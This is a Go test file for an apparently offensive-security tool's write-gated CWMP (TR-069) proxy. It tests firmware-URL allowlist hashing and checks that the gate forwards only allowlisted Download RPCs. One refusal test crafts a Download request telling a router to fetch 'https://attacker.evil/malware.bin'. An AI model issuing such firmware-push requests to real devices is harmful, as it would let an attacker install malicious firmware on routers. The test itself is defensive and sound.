//go:build offensive

package cwmp_test

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"net"
	"net/http"
	"strings"
	"testing"
	"time"

	"local/elsereno/offensive/confirm"
	cwmpwrite "local/elsereno/offensive/write/cwmp"
)

// ---- Hash ladder: firmware variant degrades --------------

func TestAllowlistHashWithFirmware_EmptyMatchesV12Chunk1(t *testing.T) {
	rpcs := []cwmpwrite.AllowedRPC{{Name: "Download"}}
	paths := []cwmpwrite.AllowedParameterPath{{Prefix: "InternetGatewayDevice."}}
	h12c1 := cwmpwrite.AllowlistHashWithParameterPaths("acs:7547", rpcs, paths)
	h12c10 := cwmpwrite.AllowlistHashWithFirmware("acs:7547", rpcs, paths, nil)
	if !bytes.Equal(h12c1[:], h12c10[:]) {
		t.Fatalf("chunk-10 with empty firmware differs from chunk-1: %x vs %x", h12c10, h12c1)
	}
}

func TestAllowlistHashWithFirmware_EmptyAllMatchesV11(t *testing.T) {
	rpcs := []cwmpwrite.AllowedRPC{{Name: "Download"}}
	h11 := cwmpwrite.AllowlistHash("acs:7547", rpcs)
	h12c10 := cwmpwrite.AllowlistHashWithFirmware("acs:7547", rpcs, nil, nil)
	if !bytes.Equal(h11[:], h12c10[:]) {
		t.Fatalf("chunk-10 all-empty differs from v1.11: %x vs %x", h12c10, h11)
	}
}

func TestAllowlistHashWithFirmware_NonEmptyChangesHash(t *testing.T) {
	rpcs := []cwmpwrite.AllowedRPC{{Name: "Download"}}
	fws := []cwmpwrite.AllowedFirmware{
		{URL: "https://acs.example.com/firmware/router-1.2.3.bin"},
	}
	h12c1 := cwmpwrite.AllowlistHashWithParameterPaths("acs:7547", rpcs, nil)
	h12c10 := cwmpwrite.AllowlistHashWithFirmware("acs:7547", rpcs, nil, fws)
	if bytes.Equal(h12c1[:], h12c10[:]) {
		t.Fatal("chunk-10 with non-empty firmware must differ from chunk-1")
	}
}

func TestAllowlistHashWithFirmware_OrderInsensitive(t *testing.T) {
	rpcs := []cwmpwrite.AllowedRPC{{Name: "Download"}}
	a := []cwmpwrite.AllowedFirmware{
		{URL: "https://acs.example.com/a.bin", SHA256: "aa"},
		{URL: "https://acs.example.com/b.bin", SHA256: "bb"},
	}
	b := []cwmpwrite.AllowedFirmware{
		{URL: "https://acs.example.com/b.bin", SHA256: "bb"},
		{URL: "https://acs.example.com/a.bin", SHA256: "aa"},
	}
	h1 := cwmpwrite.AllowlistHashWithFirmware("acs:7547", rpcs, nil, a)
	h2 := cwmpwrite.AllowlistHashWithFirmware("acs:7547", rpcs, nil, b)
	if !bytes.Equal(h1[:], h2[:]) {
		t.Fatal("hash depends on firmware input order")
	}
}

// TestAllowlistHashWithFirmware_URLCaseInsensitive — scheme +
// host are lowercased; entries differing only in host case
// should produce the same hash.
func TestAllowlistHashWithFirmware_URLCaseInsensitive(t *testing.T) {
	rpcs := []cwmpwrite.AllowedRPC{{Name: "Download"}}
	a := []cwmpwrite.AllowedFirmware{
		{URL: "HTTPS://ACS.EXAMPLE.COM/firmware.bin"},
	}
	b := []cwmpwrite.AllowedFirmware{
		{URL: "https://acs.example.com/firmware.bin"},
	}
	h1 := cwmpwrite.AllowlistHashWithFirmware("acs:7547", rpcs, nil, a)
	h2 := cwmpwrite.AllowlistHashWithFirmware("acs:7547", rpcs, nil, b)
	if !bytes.Equal(h1[:], h2[:]) {
		t.Fatalf("scheme/host should be case-folded: %x vs %x", h1, h2)
	}
}

// TestAllowlistHashWithFirmware_DefaultPortStripped — :443 on
// https + :80 on http should canonicalise away.
func TestAllowlistHashWithFirmware_DefaultPortStripped(t *testing.T) {
	rpcs := []cwmpwrite.AllowedRPC{{Name: "Download"}}
	a := []cwmpwrite.AllowedFirmware{
		{URL: "https://acs.example.com:443/firmware.bin"},
	}
	b := []cwmpwrite.AllowedFirmware{
		{URL: "https://acs.example.com/firmware.bin"},
	}
	h1 := cwmpwrite.AllowlistHashWithFirmware("acs:7547", rpcs, nil, a)
	h2 := cwmpwrite.AllowlistHashWithFirmware("acs:7547", rpcs, nil, b)
	if !bytes.Equal(h1[:], h2[:]) {
		t.Fatal("default port should be stripped on canonicalisation")
	}
}

// ---- E2E gate tests --------------------------------------

// driveFirmwareSession boots a CWMP gated handler with the given
// firmware allowlist (Download + AllowedFirmware) and returns a
// client pipe + the upstream ACS recorder. Mirrors the
// gatedproxy_test.go driveSession helper but with firmware
// extension.
func driveFirmwareSession(t *testing.T, fws []cwmpwrite.AllowedFirmware) (net.Conn, *upstreamACS) {
	t.Helper()
	target := "acs.test:7547"
	rpcs := []cwmpwrite.AllowedRPC{{Name: "Download"}}
	mut := cwmpwrite.SessionMutationWithFirmware(target, rpcs, nil, fws)
	tok, err := confirm.ExpectedToken(mut, &fakeDeriver{key: []byte(testDeriverKey)})
	if err != nil {
		t.Fatal(err)
	}
	h := &cwmpwrite.WriteGatedHandler{
		Target:          target,
		Allowed:         rpcs,
		AllowedFirmware: fws,
		Deriver:         &fakeDeriver{key: []byte(testDeriverKey)},
		Auditor:         &fakeAuditor{},
		SessionConfirm: confirm.Confirm{
			AcceptsWrites: true,
			ConfirmTarget: target,
			ConfirmToken:  tok,
		},
	}
	if err := h.Authorise(context.Background()); err != nil {
		t.Fatal(err)
	}
	clientPipe, handlerClientSide := net.Pipe()
	handlerUpstreamSide, originSide := net.Pipe()
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(func() {
		cancel()
		_ = clientPipe.Close()
		_ = handlerClientSide.Close()
		_ = handlerUpstreamSide.Close()
		_ = originSide.Close()
	})
	acs := &upstreamACS{}
	go acs.run(originSide)
	go func() { _ = h.Handle(ctx, handlerClientSide, handlerUpstreamSide) }()
	return clientPipe, acs
}

// buildDownloadRequest crafts a CWMP Download SOAP envelope with
// the given URL.
func buildDownloadRequest(url string) string {
	body := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<soap-env:Envelope xmlns:soap-env="http://schemas.xmlsoap.org/soap/envelope/"
                   xmlns:cwmp="urn:dslforum-org:cwmp-1-2">
  <soap-env:Body>
    <cwmp:Download>
      <CommandKey>fw-upgrade-1</CommandKey>
      <FileType>1 Firmware Upgrade Image</FileType>
      <URL>%s</URL>
      <FileSize>0</FileSize>
      <DelaySeconds>0</DelaySeconds>
    </cwmp:Download>
  </soap-env:Body>
</soap-env:Envelope>`, url)
	return fmt.Sprintf("POST / HTTP/1.1\r\nHost: acs.test:7547\r\nContent-Type: text/xml; charset=utf-8\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
		len(body), body)
}

// TestGateCWMPFirmware_AllowedURLPasses — Download with URL in
// allowlist forwards upstream.
func TestGateCWMPFirmware_AllowedURLPasses(t *testing.T) {
	fws := []cwmpwrite.AllowedFirmware{
		{URL: "https://acs.example.com/firmware/router-1.2.3.bin"},
	}
	client, upstream := driveFirmwareSession(t, fws)
	_, _ = client.Write([]byte(buildDownloadRequest("https://acs.example.com/firmware/router-1.2.3.bin")))

	deadline := time.Now().Add(500 * time.Millisecond)
	for time.Now().Before(deadline) {
		if _, n := upstream.seen(); n > 0 {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	body, n := upstream.seen()
	if n == 0 {
		t.Fatal("upstream saw nothing for allowed firmware Download")
	}
	if !strings.Contains(body, "<URL>https://acs.example.com/firmware/router-1.2.3.bin</URL>") {
		t.Errorf("upstream body missing the allowed URL:\n%s", body)
	}
}

// TestGateCWMPFirmware_ForbiddenURLRefuses — Download URL not in
// allowlist gets a SOAP 9001 fault with X-Elsereno-Gate-Reason
// header pointing at firmware.
func TestGateCWMPFirmware_ForbiddenURLRefuses(t *testing.T) {
	fws := []cwmpwrite.AllowedFirmware{
		{URL: "https://acs.example.com/firmware/router-1.2.3.bin"},
	}
	client, upstream := driveFirmwareSession(t, fws)
	_, _ = client.Write([]byte(buildDownloadRequest("https://attacker.evil/malware.bin")))

	_ = client.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	br := bufio.NewReader(client)
	resp, err := http.ReadResponse(br, nil)
	if err != nil {
		t.Fatalf("read fault: %v", err)
	}
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusOK {
		t.Errorf("status = %d, want 200 (CWMP faults are 200 OK with body)", resp.StatusCode)
	}
	reason := resp.Header.Get("X-Elsereno-Gate-Reason")
	if !strings.Contains(reason, "firmware URL") {
		t.Errorf("X-Elsereno-Gate-Reason = %q, want firmware-URL mention", reason)
	}
	bodyBytes := make([]byte, 4096)
	bn, _ := resp.Body.Read(bodyBytes)
	body := string(bodyBytes[:bn])
	if !strings.Contains(body, "<FaultCode>9001</FaultCode>") {
		t.Errorf("missing FaultCode 9001 in body:\n%s", body)
	}
	time.Sleep(50 * time.Millisecond)
	if _, n := upstream.seen(); n != 0 {
		t.Fatalf("upstream saw %d frames for forbidden firmware URL", n)
	}
}

// TestGateCWMPFirmware_EmptyAllowlistBypasses — an empty
// AllowedFirmware list disables the firmware gate; Download
// passes RPC-only (v1.11/chunk-1 fallback).
func TestGateCWMPFirmware_EmptyAllowlistBypasses(t *testing.T) {
	client, upstream := driveFirmwareSession(t, nil)
	_, _ = client.Write([]byte(buildDownloadRequest("https://anywhere.example.com/anything.bin")))

	deadline := time.Now().Add(500 * time.Millisecond)
	for time.Now().Before(deadline) {
		if _, n := upstream.seen(); n > 0 {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	if _, n := upstream.seen(); n == 0 {
		t.Fatal("empty firmware allowlist should bypass per-firmware check")
	}
}

// TestGateCWMPFirmware_CanonicalisationMatches — operator
// allowlist uses lowercase + no port; ACS sends mixed-case
// host with default port. Canonicaliser should match.
func TestGateCWMPFirmware_CanonicalisationMatches(t *testing.T) {
	fws := []cwmpwrite.AllowedFirmware{
		{URL: "https://acs.example.com/firmware.bin"},
	}
	client, upstream := driveFirmwareSession(t, fws)
	_, _ = client.Write([]byte(buildDownloadRequest("HTTPS://ACS.Example.com:443/firmware.bin")))

	deadline := time.Now().Add(500 * time.Millisecond)
	for time.Now().Before(deadline) {
		if _, n := upstream.seen(); n > 0 {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	if _, n := upstream.seen(); n == 0 {
		t.Fatal("canonicalised match should pass (case + default-port stripping)")
	}
}
